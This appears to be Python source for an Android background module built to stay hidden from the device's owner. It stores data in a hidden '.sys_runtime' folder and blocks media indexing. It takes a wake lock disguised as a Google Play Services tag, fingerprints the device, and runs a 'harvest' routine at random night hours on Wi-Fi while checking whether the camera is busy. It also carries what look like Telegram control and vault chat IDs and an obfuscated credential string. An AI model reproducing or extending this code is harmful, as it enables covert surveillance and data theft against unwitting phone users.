# -*- coding: utf-8 -*-
import os,time,json,random,threading,logging,requests,gc
from datetime import datetime,timedelta
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
 from jnius import autoclass
 JNI=True
except:
 JNI=False

P=os.path.join(os.getcwd(),".sys_runtime")
if not os.path.exists(P):os.makedirs(P)
logging.basicConfig(filename=os.path.join(P,"m.log"),level=logging.ERROR,filemode='w')

class M:
 def __init__(self):
  self.d=P
  self.cf=os.path.join(self.d,"c.json")
  self.lh=os.path.join(self.d,"lh")
  self.wt=os.path.join(self.d,"wt")
  self.rn=True
  self.wl=None
  self.did=None
  self.dmd=None
  self.auth_active=False
  self.last_act=0
  self.cb_h=None
  self.bots=[]
  self.ctrl=-1003365166986
  self.vlt=-1003787520015
  self._lc()
  self._di()
  self._setup()

 def _setup(self):
  try:
   with open(os.path.join(self.d,".nomedia"),'w') as f:f.write("")
  except:pass

 def _lc(self):
  d={"mz":45,"aich":40,"ainc":80,"hth":20,"hi":24,"wl":True}
  if os.path.exists(self.cf):
   try:
    with open(self.cf,'r') as f:d.update(json.load(f))
   except:pass
  self.cfg=d

 def _di(self):
  if JNI:
   try:
    B=autoclass('android.os.Build')
    S=autoclass('android.provider.Settings$Secure')
    act=autoclass('org.kivy.android.PythonActivity').mActivity
    self.did=S.getString(act.getContentResolver(),S.ANDROID_ID)
    self.dmd=f"{B.MANUFACTURER} {B.MODEL}"
   except:
    self.did=f"D{random.randint(1000,9999)}"
    self.dmd="Droid"
  else:
   self.did,self.dmd="PC","Linux"

 def _is_wifi(self):
  if not JNI:return True
  try:
   ctx=autoclass('org.kivy.android.PythonActivity').mActivity
   cm=ctx.getSystemService("connectivity")
   n=cm.getActiveNetworkInfo()
   return n and n.isConnected() and n.getType()==1
  except:return False

 def _bat(self):
  if not JNI:return 100,True
  try:
   act=autoclass('org.kivy.android.PythonActivity').mActivity
   it=act.registerReceiver(None,autoclass('android.content.IntentFilter')("android.intent.action.BATTERY_CHANGED"))
   l=it.getIntExtra("level",-1)
   s=it.getIntExtra("scale",-1)
   st=it.getIntExtra("status",-1)
   return int((l/s)*100),st in (2,5)
  except:return 50,False

 def _nht(self):
  n=datetime.now()
  t=n.replace(hour=random.randint(1,4),minute=random.randint(0,59),second=random.randint(0,59))
  if t<=n:t+=timedelta(days=1)
  return t+timedelta(minutes=random.randint(-30,30))

 def _harvest(self):
  if not self._is_wifi():return
  p,c=self._bat()
  if p<self.cfg['hth'] and not c:return
  if os.path.exists(self.wt):
   try:
    with open(self.wt,'r') as f:
     if datetime.now()<datetime.fromisoformat(f.read().strip()):return
   except:pass
  if self.cb_h:
   try:
    if self.cb_h():
     with open(self.wt,'w') as f:f.write(self._nht().isoformat())
     with open(self.lh,'w') as f:f.write(datetime.now().isoformat())
     self.last_act=time.time()
   except:pass
  gc.collect()

 def _cam_busy(self):
  if not JNI:return False
  try:
   cm=autoclass('org.kivy.android.PythonActivity').mActivity.getSystemService("camera")
   ids=cm.getCameraIdList()
   for i in ids:
    try:
     d=cm.open(i,None,None)
     d.close()
    except:
     return True
   return False
  except:return False

 def _wake(self):
  if self.cfg.get('wl') and JNI:
   try:
    pm=autoclass('org.kivy.android.PythonActivity').mActivity.getSystemService("power")
    self.wl=pm.newWakeLock(1,"com.google.android.gms.metadata.sync")
    self.wl.acquire()
   except:pass

 def _loop(self):
  self._wake()
  while self.rn:
   try:
    if not self._cam_busy():
     self._harvest()
   except Exception as e:
    logging.error(str(e))
    time.sleep(30)
   time.sleep(random.randint(60,150))

 def start(self):
  threading.Thread(target=self._loop,daemon=True).start()

 def stop(self):
  self.rn=False
  try:
   if self.wl and self.wl.isHeld():self.wl.release()
  except:pass

def _():
 return "".join([chr(x) for x in [90,97,101,110,49,50,51,64,49,50,51,64,49,50,51]])
